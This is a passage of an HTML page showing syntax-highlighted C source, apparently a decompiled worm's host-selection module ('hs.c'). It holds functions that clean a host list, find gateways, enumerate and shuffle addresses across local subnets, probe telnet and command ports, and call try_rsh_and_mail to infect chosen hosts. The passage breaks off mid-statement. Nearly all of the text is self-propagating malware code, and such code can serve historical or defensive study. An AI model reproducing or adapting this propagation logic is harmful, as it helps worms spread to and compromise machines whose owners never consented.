<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Dover.Worm.Code - HS.C.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">/* dover */</span><span class="sc0">

</span><span class="sc9">#include "worm.h"
#include &lt;stdio.h&gt;
#include &lt;strings.h&gt;
#include &lt;signal.h&gt;
#include &lt;errno.h&gt;
#include &lt;ctype.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;sys/file.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
</span><span class="sc0">
</span><span class="sc16">extern</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">hst</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">h_addr2host</span><span class="sc10">(),</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">h_name2host</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc16">extern</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0">  </span><span class="sc11">justreturn</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc16">extern</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">errno</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">extern</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">malloc</span><span class="sc10">();</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">alarmed</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ngateways</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">gateways</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">hst</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">me</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">hosts</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">nifs</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">ifses</span><span class="sc0"> </span><span class="sc11">ifs</span><span class="sc10">[</span><span class="sc4">30</span><span class="sc10">];</span><span class="sc0">               </span><span class="sc1">/*  Arbitrary number, fix */</span><span class="sc0">

</span><span class="sc1">/* Clean hosts not contacted from the host list. */</span><span class="sc0">
</span><span class="sc11">h_clean</span><span class="sc10">()</span><span class="sc0">                   </span><span class="sc1">/* 0x31f0 */</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">hst</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">newhosts</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">host</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">next</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc11">newhosts</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">hosts</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">next</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">next</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">next</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">flag</span><span class="sc0"> </span><span class="sc10">&amp;=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">7</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">me</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">flag</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">next</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">newhosts</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">newhosts</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0">
        </span><span class="sc11">free</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">hosts</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">newhosts</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Look for a gateway we can contact. */</span><span class="sc0">
</span><span class="sc11">hg</span><span class="sc10">()</span><span class="sc0">                </span><span class="sc1">/* 0x3270, check again */</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">hst</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">host</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc11">rt_init</span><span class="sc10">();</span><span class="sc0">
    
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">ngateways</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">       </span><span class="sc1">/* 24, 92 */</span><span class="sc0">
    </span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">h_addr2host</span><span class="sc10">(</span><span class="sc11">gateways</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">try_rsh_and_mail</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">ha</span><span class="sc10">()</span><span class="sc0">                        </span><span class="sc1">/* 0x32d4, unchecked */</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">hst</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">host</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">l416</span><span class="sc10">[</span><span class="sc4">100</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">l420</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ngateways</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc11">rt_init</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc11">j</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">ngateways</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">       </span><span class="sc1">/* 40, 172 */</span><span class="sc0">
    </span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">h_addr2host</span><span class="sc10">(</span><span class="sc11">gateways</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">k</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">6</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">       </span><span class="sc1">/* 86, 164 */</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">o48</span><span class="sc10">[</span><span class="sc11">k</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">           </span><span class="sc1">/* 158 */</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">try_telnet_p</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">o48</span><span class="sc10">[</span><span class="sc11">k</span><span class="sc10">])</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">l416</span><span class="sc10">[</span><span class="sc11">j</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">o48</span><span class="sc10">[</span><span class="sc11">k</span><span class="sc10">];</span><span class="sc0">
        </span><span class="sc11">j</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    
    </span><span class="sc11">permute</span><span class="sc10">(</span><span class="sc11">l416</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">l416</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]));</span><span class="sc0">
    
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">           </span><span class="sc1">/* 198, 260 */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hi_84</span><span class="sc10">(</span><span class="sc11">l416</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc11">netmaskfor</span><span class="sc10">(</span><span class="sc11">l416</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">])))</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">hl</span><span class="sc10">()</span><span class="sc0">                        </span><span class="sc1">/* 0x33e6 */</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">6</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">           </span><span class="sc1">/* 18, 106 */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">me</span><span class="sc10">-&gt;</span><span class="sc11">o48</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hi_84</span><span class="sc10">(</span><span class="sc11">me</span><span class="sc10">-&gt;</span><span class="sc11">o48</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc11">netmaskfor</span><span class="sc10">(</span><span class="sc11">me</span><span class="sc10">-&gt;</span><span class="sc11">o48</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">hi</span><span class="sc10">()</span><span class="sc0">                        </span><span class="sc1">/* 0x3458 */</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">hst</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">host</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">hosts</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">next</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">flag</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x08</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">try_rsh_and_mail</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">hi_84</span><span class="sc10">(</span><span class="sc11">arg1</span><span class="sc10">)</span><span class="sc0">                 </span><span class="sc1">/* 0x34ac */</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">l4</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">hst</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">host</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">l12</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l16</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l20</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l28</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">adr_index</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l36</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l40</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l44</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">netaddrs</span><span class="sc10">[</span><span class="sc4">2048</span><span class="sc10">];</span><span class="sc0">
    
    </span><span class="sc11">l12</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">netmaskfor</span><span class="sc10">(</span><span class="sc11">arg1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">l16</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">~</span><span class="sc11">l12</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">nifs</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">        </span><span class="sc1">/* 128,206 */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">arg1</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ifs</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">if_l24</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc11">ifs</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">if_l16</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">               </span><span class="sc1">/* 624 */</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    
    </span><span class="sc11">adr_index</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">l16</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x0000ffff</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">            </span><span class="sc1">/* 330 */</span><span class="sc0">
    </span><span class="sc11">l44</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">l40</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">l40</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">255</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">l40</span><span class="sc10">++)</span><span class="sc0">     </span><span class="sc1">/* 236,306 */</span><span class="sc0">
        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">l20</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">l20</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">l20</span><span class="sc10">++)</span><span class="sc0">  </span><span class="sc1">/* 254,300 */</span><span class="sc0">
        </span><span class="sc11">netaddrs</span><span class="sc10">[</span><span class="sc11">adr_index</span><span class="sc10">++]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">arg1</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">l20</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">16</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">l40</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">permute</span><span class="sc10">(</span><span class="sc11">netaddrs</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">adr_index</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">netaddrs</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]));</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">                    </span><span class="sc1">/* 432 */</span><span class="sc0">
    </span><span class="sc11">l44</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">l20</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">l20</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">255</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">l20</span><span class="sc10">++)</span><span class="sc0">
        </span><span class="sc11">netaddrs</span><span class="sc10">[</span><span class="sc11">adr_index</span><span class="sc10">++]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">arg1</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">l20</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">permute</span><span class="sc10">(</span><span class="sc11">netaddrs</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">*</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">netaddrs</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]),</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">netaddrs</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]));</span><span class="sc0">
    </span><span class="sc11">permute</span><span class="sc10">(</span><span class="sc11">netaddrs</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">adr_index</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">6</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">adr_index</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">20</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc11">adr_index</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">20</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">l36</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">l36</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">adr_index</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">l36</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc1">/* 454,620 */</span><span class="sc0">
    </span><span class="sc11">l4</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">netaddrs</span><span class="sc10">[</span><span class="sc11">l36</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">h_addr2host</span><span class="sc10">(</span><span class="sc11">l4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">flag</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x02</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">flag</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x04</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc11">command_port_p</span><span class="sc10">(</span><span class="sc11">l4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l44</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">h_addr2host</span><span class="sc10">(</span><span class="sc11">l4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">try_rsh_and_mail</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">))</span><span class="sc0">
